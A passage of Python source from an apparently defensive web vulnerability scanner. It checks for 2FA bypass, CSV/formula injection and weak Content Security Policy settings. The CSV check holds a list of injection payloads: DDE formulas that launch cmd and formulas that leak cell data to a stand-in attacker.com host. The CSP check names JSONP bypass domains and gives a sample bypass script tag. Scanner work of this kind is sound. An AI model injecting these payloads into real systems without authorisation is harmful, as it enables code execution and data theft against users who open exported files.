                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.FIRM,
                            severity=Severity.HIGH,
                            cvss=7.5,
                            description=(
                                f"2FA bypass: Protected resource {ppath} accessible without completing 2FA! "
                                f"Direct GET returned HTTP 200 with user data. "
                                f"Authentication session may persist even when 2FA is enforced."
                            ),
                            evidence=self._make_evidence(
                                request_raw=f"GET {purl} HTTP/1.1",
                                response=resp,
                                payload=f"Direct access to {ppath} without 2FA",
                                poc_curl=f"curl -s '{purl}' -b '<SESSION_COOKIE>'",
                            ),
                            insertion_point=insertion_point,
                        ))
                        break
            except Exception:
                pass

        return findings


# ---------------------------------------------------------------------------
# CSV / Formula Injection
# ---------------------------------------------------------------------------

_CSV_PAYLOADS = [
    # Classic formula injection — spreadsheet opens system()
    '=cmd|" /C calc"!A0',
    '=HYPERLINK("http://attacker.com/?leak="&A1)',
    '=SUM(1+1)*cmd|"/c calc"!A0',
    '+cmd|"/c calc"!A0',
    '-cmd|"/c calc"!A0',
    '@cmd|"/c calc"!A0',
    # DDE attacks
    '=DDE("cmd","/c calc","","1")',
    # IMPORTXML / IMPORTFEED data exfiltration
    '=IMPORTXML(CONCAT("http://attacker.com/?d=",SUBSTITUTE(A1," ","+")),"//*")',
    # Hyperlink exfiltration
    '=HYPERLINK("ftp://attacker.com/","click")',
    # Longer variant that passes some simple filters
    '\t=cmd|"/c calc"!A0',
    '\n=cmd|"/c calc"!A0',
    '"\t=cmd|"/c calc"!A0"',
]


class CsvInjectionCheck(BaseScanCheck):
    """
    Detect CSV / formula injection (also called "CSV Injection" or "Excel Macro Injection").

    Strategy:
      1. Inject a formula payload into every text insertion point.
      2. Fetch any endpoint ending in .csv / with Accept: text/csv.
      3. If the raw formula appears UNESCAPED in the response body → CERTAIN.
      4. As a passive fallback: scan crawled responses for unescaped formulas in CSV bodies.

    Anti-hallucination:
      - Baseline with benign value first — payload canary must not pre-exist.
      - Only flag unescaped formula (leading = + - @ \t \n) in a CSV-content-type response.
    """
    check_id   = "csv-injection"
    check_type = CheckType.ACTIVE
    name       = "CSV / Formula Injection"
    description = (
        "CSV formula injection (DDE/Excel) — injected formulas executed when "
        "victim opens exported CSV in a spreadsheet application."
    )

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        results: list[CheckResult] = []
        canary = f"NEXUS{uuid.uuid4().hex[:6]}"

        # Only test fields that are likely to end up in an exported report
        if insertion_point.ip_type not in (IPType.BODY_PARAM, IPType.QUERY_PARAM, IPType.JSON_KEY):
            return results

        # Look for CSV export endpoints on the same base URL
        base = str(insertion_point.url).rstrip("/")
        export_paths = [
            f"{base}/export",
            f"{base}/export.csv",
            f"{base}/download",
            f"{base}/download.csv",
            f"{base}/report",
            f"{base}/report.csv",
            f"{base}?format=csv",
            f"{base}?export=1",
        ]

        for payload in _CSV_PAYLOADS:
            tagged_payload = payload.replace("attacker.com", f"attacker-{canary}.com")
            try:
                # Inject formula into the insertion point
                await self._probe_ip(client, insertion_point, tagged_payload)

                # Try to fetch the export endpoint
                for export_url in export_paths:
                    try:
                        r = await client.get(
                            export_url,
                            headers={"Accept": "text/csv,application/csv,*/*"},
                            timeout=10.0,
                        )
                        ct = r.headers.get("content-type", "")
                        body = r.text

                        is_csv = (
                            "text/csv" in ct
                            or "application/csv" in ct
                            or export_url.endswith(".csv")
                            or "format=csv" in export_url
                        )
                        if not is_csv or r.status_code not in (200, 206):
                            continue

                        # Check for unescaped formula in CSV output
                        if canary in body and _formula_unescaped(body, tagged_payload):
                            results.append(CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.CERTAIN,
                                severity=Severity.HIGH,
                                cvss=8.0,
                                description=(
                                    f"CSV formula injection confirmed — formula appears unescaped "
                                    f"in exported CSV at {export_url}. "
                                    f"Opening this file in Excel/LibreOffice will execute the formula."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=f"GET {export_url}",
                                    response=r,
                                    payload=tagged_payload,
                                    poc_curl=f"curl -s '{export_url}'",
                                ),
                                insertion_point=insertion_point,
                            ))
                            return results
                    except Exception:
                        pass
            except Exception:
                pass

        return results

    async def _probe_ip(
        self,
        client: httpx.AsyncClient,
        ip: InsertionPoint,
        payload: str,
    ):
        """Submit the payload into the insertion point."""
        if ip.ip_type == IPType.QUERY_PARAM:
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            parsed = urlparse(ip.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[ip.name] = [payload]
            new_query = urlencode(params, doseq=True)
            url = urlunparse(parsed._replace(query=new_query))
            await client.get(url)
        elif ip.ip_type in (IPType.BODY_PARAM, IPType.JSON_KEY):
            await client.post(
                ip.url,
                json={ip.name: payload},
                headers={"Content-Type": "application/json"},
            )

    async def check_passive(self, crawl_result) -> list[CheckResult]:
        """Passive: scan already-crawled CSV responses for raw formulas."""
        results: list[CheckResult] = []
        ct = crawl_result.content_type or ""
        if "csv" not in ct.lower():
            return results

        body = crawl_result.body or ""
        for formula_char in ("=", "+", "-", "@"):
            # Find a line starting with the formula character
            for line in body.splitlines()[:50]:
                stripped = line.strip().lstrip('"').lstrip("'")
                if stripped.startswith(formula_char) and len(stripped) > 5:
                    results.append(CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.FIRM,
                        severity=Severity.MEDIUM,
                        cvss=6.8,
                        description=(
                            f"CSV formula injection vector detected in exported CSV response. "
                            f"Field value starts with '{formula_char}' — may execute in Excel."
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"GET {crawl_result.url}",
                            response=None,
                            payload=line[:120],
                            poc_curl=f"curl -s '{crawl_result.url}'",
                        ),
                        insertion_point=None,
                    ))
                    break
            if results:
                break
        return results


def _formula_unescaped(body: str, payload: str) -> bool:
    """Return True if the payload appears unescaped (not prefixed with ') in CSV body."""
    # Check for raw formula — not wrapped in quotes preceded by apostrophe
    for line in body.splitlines():
        if payload[:10] in line:
            # If the cell is prefixed with ' it means the app escaped it → safe
            if not re.search(r"[\"'],\s*'" + re.escape(payload[:6]), line):
                return True
    return False


# ---------------------------------------------------------------------------
# CSP (Content Security Policy) Bypass Analysis
# ---------------------------------------------------------------------------

_UNSAFE_CSP_DIRECTIVES = [
    ("unsafe-inline", "script-src", "HIGH",   8.8, "Allows inline <script> — bypasses CSP entirely"),
    ("unsafe-eval",   "script-src", "HIGH",   8.0, "Allows eval() — bypasses CSP isolation"),
    ("unsafe-inline", "style-src",  "MEDIUM", 5.4, "Allows inline <style> — CSS injection possible"),
    ("data:",         "script-src", "HIGH",   8.0, "data: URI in script-src allows inline code execution"),
    ("*",             "script-src", "CRITICAL", 9.0, "Wildcard in script-src — any domain can serve scripts"),
    ("http:",         "script-src", "HIGH",   8.0, "http: in script-src — scripts can be served over HTTP"),
    ("'none'",        None,         None,     0.0, ""),   # marker for absent directives
]

_BYPASS_DOMAINS = [
    # Google CDN — unsafe-inline bypass vector via JSONP/Angular
    "ajax.googleapis.com",
    "www.google.com",
    "accounts.google.com",
    # CDN whitelists often exploitable
    "cdn.jsdelivr.net",
    "unpkg.com",
    "cdnjs.cloudflare.com",
    # Angular 1.x JSONP endpoints
    "www.googletagmanager.com",
    # Trusted types bypass
    "storage.googleapis.com",
]

_CSP_CHECK_TYPE = CheckType.PASSIVE


class CspBypassCheck(BaseScanCheck):
    """
    Passive CSP (Content Security Policy) weakness and bypass detection.

    Checks:
      1. CSP header absent entirely → HIGH
      2. unsafe-inline / unsafe-eval in script-src → HIGH
      3. Wildcard (*) or http: in script-src → CRITICAL
      4. Allowlisted bypass domains (CDN JSONP vectors) → HIGH
      5. Missing default-src fallback → MEDIUM
      6. Missing report-uri / report-to → INFO (no reporting)
      7. meta http-equiv CSP in HTML body (weaker) → MEDIUM

    Anti-hallucination:
      All findings are from direct header inspection — no active requests.
    """
    check_id   = "csp-bypass"
    check_type = _CSP_CHECK_TYPE
    name       = "Content Security Policy (CSP) Weakness"
    description = "Detects weak or bypassable CSP directives"

    async def check_passive(self, crawl_result) -> list[CheckResult]:
        results: list[CheckResult] = []
        headers = crawl_result.headers or {}
        body    = crawl_result.body or ""

        # Normalise header names to lowercase
        headers_lc = {k.lower(): v for k, v in headers.items()}

        csp_value = (
            headers_lc.get("content-security-policy")
            or headers_lc.get("x-content-security-policy")
            or headers_lc.get("x-webkit-csp")
            or ""
        )

        # ── 1. CSP absent entirely ───────────────────────────────────────────
        if not csp_value:
            # Also check meta tag
            meta_csp = re.search(
                r'<meta\s[^>]*http-equiv\s*=\s*["\']content-security-policy["\'][^>]*content\s*=\s*["\']([^"\']+)',
                body,
                re.IGNORECASE,
            )
            if meta_csp:
                csp_value = meta_csp.group(1)
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.MEDIUM,
                    cvss=5.4,
                    description=(
                        f"CSP delivered via <meta> tag instead of HTTP header. "
                        f"Meta CSP does not protect against XSS injected in the document head "
                        f"and cannot block navigation/frame CSP."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET {crawl_result.url}",
                        response=None,
                        payload="",
                        poc_curl=f"curl -sI '{crawl_result.url}'",
                    ),
                    insertion_point=None,
                ))
            else:
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.HIGH,
                    cvss=7.5,
                    description=(
                        "No Content-Security-Policy header present. "
                        "XSS attacks are not mitigated by CSP — any injected script will execute."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET {crawl_result.url}",
                        response=None,
                        payload="",
                        poc_curl=f"curl -sI '{crawl_result.url}'",
                    ),
                    insertion_point=None,
                ))
                return results  # No CSP to analyse further

        # ── 2. Parse directives ───────────────────────────────────────────────
        directives: dict[str, list[str]] = {}
        for part in csp_value.split(";"):
            part = part.strip()
            if not part:
                continue
            tokens = part.split()
            if tokens:
                directives[tokens[0].lower()] = [t.lower() for t in tokens[1:]]

        script_src = (
            directives.get("script-src")
            or directives.get("default-src")
            or []
        )

        # ── 3. Dangerous directives ───────────────────────────────────────────
        for bad_val, directive_name, sev_str, cvss, reason in _UNSAFE_CSP_DIRECTIVES:
            if sev_str is None:
                continue
            sev = Severity[sev_str]
            values_to_check = directives.get(directive_name, []) if directive_name else []
            if directive_name == "script-src":
                values_to_check = script_src

            if bad_val.lower() in values_to_check:
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=sev,
                    cvss=cvss,
                    description=(
                        f"CSP weakness: '{bad_val}' in {directive_name or 'CSP'}. {reason}. "
                        f"Full directive: {directive_name}: {' '.join(values_to_check)}"
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET {crawl_result.url}",
                        response=None,
                        payload=csp_value[:300],
                        poc_curl=f"curl -sI '{crawl_result.url}' | grep -i content-security",
                    ),
                    insertion_point=None,
                ))

        # ── 4. Allowlisted bypass domains ─────────────────────────────────────
        for domain in _BYPASS_DOMAINS:
            if domain in " ".join(script_src):
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.FIRM,
                    severity=Severity.HIGH,
                    cvss=7.4,
                    description=(
                        f"CSP script-src allowlists {domain!r} which has known JSONP/Angular "
                        f"endpoints usable to bypass CSP. An attacker can load "
                        f"https://{domain}/...?callback=alert(1) to execute scripts."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET {crawl_result.url}",
                        response=None,
                        payload=f"script-src: {' '.join(script_src)}",
                        poc_curl=(
                            f"curl -sI '{crawl_result.url}' | grep -i content-security\n"
                            f"# Bypass: <script src='https://{domain}/...?callback=alert(1)'></script>"
                        ),
                    ),
                    insertion_point=None,
                ))

        # ── 5. Missing default-src fallback ───────────────────────────────────
        if "default-src" not in directives and "script-src" not in directives:
            results.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=Severity.MEDIUM,
                cvss=5.3,
                description=(
                    "CSP is present but has no script-src or default-src directive. "
                    "Browsers will allow all script sources — CSP provides no script protection."
                ),
                evidence=self._make_evidence(
                    request_raw=f"GET {crawl_result.url}",
                    response=None,
                    payload=csp_value[:300],
                    poc_curl=f"curl -sI '{crawl_result.url}' | grep -i content-security",
                ),
                insertion_point=None,
            ))

        return results
